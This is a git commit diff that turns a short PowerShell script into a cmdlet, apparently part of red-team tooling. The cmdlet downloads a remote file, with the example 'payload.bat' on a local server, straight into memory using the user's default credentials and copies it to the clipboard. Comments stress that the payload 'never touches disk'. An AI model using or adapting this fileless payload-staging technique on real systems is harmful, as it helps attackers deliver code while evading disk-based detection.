2a46374fa1d10721e09faf773437ef02b72f4fb6
davehardy20 <davehardy20@gmail.com>
2017-01-17 14:19:36 +0000

    Now a Cmdlet
    Made initial script a cmdlet

--- Invoke-DownFileToClip.ps1
+++ Invoke-DownFileToClip.ps1
@@ -1,16 +1,43 @@
-<#
-This code will download a file from a remote server into the $Command variable
-It then copies the contents of the variable to the clipboard for future use.
-This is really cool as the downloaded file never touches disk.
-#>
+﻿Function Invoke-DownFileToDisk {
+
+    <#
+            .Synopsis
+            Retrieve a file from a remote Server and place in clipboard
+
+            .Description
+            This cmdlet will take a URL of a file, download the file from the remote server and place the file in the clipboard for future use, without touching disk.
+
+            .Parameter url
+            URL of the remote file
+
+            Written by Dave Hardy, davehardy20@gmail.com @davehardy20
+
+            Version 0.1
+
+            .Example
+            PS> Invoke-DownFileToClip -url http://127.0.0.1:8000/payload.bat
+
+
+    #>
+
+	[cmdletbinding()]
+	Param
+	(
+		[Parameter(Mandatory = $true,
+				   HelpMessage = 'Remote Server Url')]
+		[ValidateNotNullorEmpty()]
+		[string]$url
+	)
+
 $Command = '' #This is the variable to store the downloaded payload
 
 #webclient variables
 $web=New-Object System.Net.WebClient
 $web.UseDefaultCredentials=$True
-$url="http://127.0.0.1:8000/payload.bat"
-
 $Command = $web.DownloadString($url)
 
 #Put the download file to the clipboard.
+$null = [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
 [Windows.Forms.Clipboard]::SetText($Command)
+
+}
